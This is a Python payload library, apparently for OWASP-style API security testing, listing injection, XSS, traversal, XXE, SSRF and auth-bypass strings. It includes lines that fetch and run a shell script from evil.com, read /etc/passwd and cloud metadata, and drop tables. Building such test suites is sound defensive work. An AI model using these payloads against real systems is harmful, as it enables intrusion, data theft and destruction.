"""
Security Test Payloads

Common attack payloads for OWASP API testing.
Organized by attack type.
"""

from typing import List, Dict, Any
import json
import base64
import urllib.parse


class PayloadGenerator:
    """Generate attack payloads for security testing."""
    
    # =========================================================================
    # SQL Injection Payloads
    # =========================================================================
    
    SQL_INJECTION_BASIC: List[str] = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "1; SELECT * FROM users",
        "1 UNION SELECT * FROM users",
        "' UNION SELECT NULL, NULL, NULL --",
        "admin'--",
        "1' AND '1'='1",
        "1' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "-1 OR 1=1",
        "1 OR 1=1",
        "' OR ''='",
        "'; exec xp_cmdshell('dir')--",
    ]
    
    SQL_INJECTION_BLIND: List[str] = [
        "1' AND (SELECT SUBSTRING(username,1,1) FROM users)='a'--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
        "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
        "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    ]
    
    SQL_INJECTION_UUID: List[str] = [
        "00000000-0000-0000-0000-000000000000' OR '1'='1",
        "00000000-0000-0000-0000-000000000000'; DROP TABLE users; --",
        "a' OR 'a'='a",
        "00000000-0000-0000-0000-00000000000%00",
    ]
    
    # =========================================================================
    # NoSQL Injection Payloads (MongoDB style)
    # =========================================================================
    
    NOSQL_INJECTION: List[Dict[str, Any]] = [
        {"$gt": ""},
        {"$ne": ""},
        {"$regex": ".*"},
        {"$where": "1==1"},
        {"$or": [{"foo": "bar"}, {"1": "1"}]},
        {"$and": [{"foo": "bar"}, {"$where": "1==1"}]},
    ]
    
    NOSQL_INJECTION_STRINGS: List[str] = [
        '{"$gt": ""}',
        '{"$ne": ""}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        "admin');return true;var foo=('",
        "'; return this.password; var foo='",
    ]
    
    # =========================================================================
    # Command Injection Payloads
    # =========================================================================
    
    COMMAND_INJECTION: List[str] = [
        "; ls -la",
        "| ls -la",
        "& ls -la",
        "&& ls -la",
        "|| ls -la",
        "`ls -la`",
        "$(ls -la)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; whoami",
        "| id",
        "; sleep 5",
        "| sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "\n/bin/sh\n",
        "'; ping -c 5 127.0.0.1; '",
        "\nping -c 5 127.0.0.1\n",
        "; wget http://evil.com/shell.sh | sh",
        "; curl http://evil.com/shell.sh | sh",
    ]
    
    # =========================================================================
    # XSS Payloads
    # =========================================================================
    
    XSS_BASIC: List[str] = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "'\"><script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<a href='javascript:alert(1)'>click</a>",
        "{{constructor.constructor('alert(1)')()}}",  # Template injection
    ]
    
    XSS_ENCODED: List[str] = [
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
    ]
    
    # =========================================================================
    # Path Traversal Payloads
    # =========================================================================
    
    PATH_TRAVERSAL: List[str] = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",  # Double encoding
        "..%c0%af..%c0%af..%c0%afetc/passwd",  # UTF-8 encoding
        "....//....//....//etc/passwd%00",  # Null byte
        "/etc/passwd",
        "file:///etc/passwd",
        "..%00/etc/passwd",
        "..%0d/etc/passwd",
        "..%0a/etc/passwd",
    ]
    
    # =========================================================================
    # LDAP Injection Payloads
    # =========================================================================
    
    LDAP_INJECTION: List[str] = [
        "*",
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(&)",
        "admin)(|(password=*))",
        "*)(objectClass=*",
    ]
    
    # =========================================================================
    # XML/XXE Payloads
    # =========================================================================
    
    XXE_PAYLOADS: List[str] = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    ]
    
    # =========================================================================
    # Header Injection Payloads
    # =========================================================================
    
    HEADER_INJECTION: List[str] = [
        "value\r\nX-Injected: header",
        "value\nX-Injected: header",
        "value%0d%0aX-Injected:%20header",
        "value\r\n\r\n<html>injected</html>",
    ]
    
    # =========================================================================
    # JSON Injection Payloads
    # =========================================================================
    
    JSON_INJECTION: List[str] = [
        '", "admin": true, "foo": "',
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
    ]
    
    # =========================================================================
    # Integer Overflow Payloads
    # =========================================================================
    
    INTEGER_OVERFLOW: List[int] = [
        0,
        -1,
        -999999999,
        2147483647,  # INT_MAX
        2147483648,  # INT_MAX + 1
        -2147483648,  # INT_MIN
        -2147483649,  # INT_MIN - 1
        9223372036854775807,  # LONG_MAX
        9223372036854775808,  # LONG_MAX + 1
    ]
    
    # =========================================================================
    # Boundary Testing
    # =========================================================================
    
    BOUNDARY_STRINGS: List[str] = [
        "",  # Empty
        " ",  # Single space
        "   ",  # Multiple spaces
        "\t",  # Tab
        "\n",  # Newline
        "\r\n",  # CRLF
        "\x00",  # Null byte
        "a" * 1000,  # Long string
        "a" * 10000,  # Very long string
        "a" * 100000,  # Extra long string
        "🎉" * 100,  # Unicode emoji
        "日本語" * 100,  # Unicode Japanese
        "٪", # Arabic percent
        "\u202e",  # Right-to-left override
    ]
    
    # =========================================================================
    # Authentication Bypass Tokens
    # =========================================================================
    
    AUTH_BYPASS_TOKENS: List[str] = [
        "",  # Empty token
        "null",
        "undefined",
        "None",
        "Bearer ",  # Just Bearer
        "Bearer null",
        "Bearer undefined",
        "Bearer admin",
        "Basic YWRtaW46YWRtaW4=",  # admin:admin base64
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",  # JWT alg:none
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.test",  # Forged JWT
    ]
    
    # =========================================================================
    # SSRF Payloads
    # =========================================================================
    
    SSRF_PAYLOADS: List[str] = [
        "http://localhost",
        "http://127.0.0.1",
        "http://[::1]",
        "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        "http://100.100.100.200/latest/meta-data/",  # Alibaba metadata
        "file:///etc/passwd",
        "dict://localhost:11211/stat",
        "gopher://localhost:6379/_FLUSHALL",
    ]
    
    # =========================================================================
    # Mass Assignment Payloads
    # =========================================================================
    
    @staticmethod
    def mass_assignment_payloads(original_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate mass assignment test payloads."""
        dangerous_fields = [
            ("is_admin", True),
            ("admin", True),
            ("role", "admin"),
            ("roles", ["admin"]),
            ("permissions", ["*"]),
            ("user_type", "admin"),
            ("verified", True),
            ("active", True),
            ("approved", True),
            ("is_staff", True),
            ("is_superuser", True),
            ("password", "hacked123"),
            ("email_verified", True),
            ("created_by", "admin"),
            ("user_id", "admin-user-id"),
            ("owner_id", "admin-user-id"),
            ("__proto__", {"admin": True}),
            ("constructor", {"prototype": {"admin": True}}),
        ]
        
        payloads = []
        for field, value in dangerous_fields:
            payload = original_data.copy()
            payload[field] = value
            payloads.append(payload)
        
        return payloads
    
    # =========================================================================
    # UUID Manipulation
    # =========================================================================
    
    MALICIOUS_UUIDS: List[str] = [
        "00000000-0000-0000-0000-000000000000",  # Nil UUID
        "ffffffff-ffff-ffff-ffff-ffffffffffff",  # Max UUID
        "invalid-uuid",
        "not-a-uuid",
        "../../../etc/passwd",
        "'; DROP TABLE users; --",
        "<script>alert(1)</script>",
        "{{7*7}}",  # SSTI
    ]
    
    # =========================================================================
    # Helper Methods
    # =========================================================================
    
    @classmethod
    def get_all_string_payloads(cls) -> List[str]:
        """Get all string-based attack payloads."""
        return (
            cls.SQL_INJECTION_BASIC +
            cls.SQL_INJECTION_BLIND +
            cls.NOSQL_INJECTION_STRINGS +
            cls.COMMAND_INJECTION +
            cls.XSS_BASIC +
            cls.XSS_ENCODED +
            cls.PATH_TRAVERSAL +
            cls.LDAP_INJECTION +
            cls.HEADER_INJECTION +
            cls.JSON_INJECTION +
            cls.BOUNDARY_STRINGS +
            cls.SSRF_PAYLOADS +
            cls.MALICIOUS_UUIDS
        )
    
    @classmethod
    def encode_payload(cls, payload: str, encoding: str = "url") -> str:
        """Encode payload using various methods."""
        if encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "url_double":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "html":
            return "".join(f"&#{ord(c)};" for c in payload)
        elif encoding == "unicode":
            return payload.encode("unicode_escape").decode()
        else:
            return payload
    
    @classmethod
    def generate_fuzz_strings(cls, base_value: str = "test") -> List[str]:
        """Generate fuzz strings based on a base value."""
        fuzz = [base_value]
        
        # Add common modifications
        fuzz.append(base_value + "'")
        fuzz.append(base_value + '"')
        fuzz.append(base_value + "<")
        fuzz.append(base_value + ">")
        fuzz.append(base_value + "\\")
        fuzz.append(base_value + "\x00")
        fuzz.append(base_value + "%00")
        fuzz.append(base_value + " OR 1=1")
        fuzz.append(base_value + "; ls")
        
        # Add prefix attacks
        fuzz.append("'" + base_value)
        fuzz.append('"' + base_value)
        fuzz.append("<" + base_value)
        
        return fuzz




